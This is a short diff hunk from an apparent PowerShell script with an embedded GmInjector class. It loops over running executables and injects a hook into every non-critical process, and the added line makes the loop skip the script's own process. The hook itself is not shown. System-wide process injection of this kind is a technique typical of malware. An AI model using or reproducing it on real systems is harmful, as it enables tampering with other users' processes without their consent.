@@ -3964,6 +3964,7 @@ public class GmInjector {
                 foreach ($proc in $AllProcs) {
                     if ($proc.Path -notmatch "\.exe$") { continue }
                     if ($CriticalProcs -contains $proc.Name) { continue }
+                    if ($proc.Id -eq $PID) { continue }  # Skip self to avoid crashing the running script
                     $rc = [GmInjector]::Inject($proc.Id, $destHook)
                     if ($rc) { $Injected++ } else { $Skipped++ }
                 }
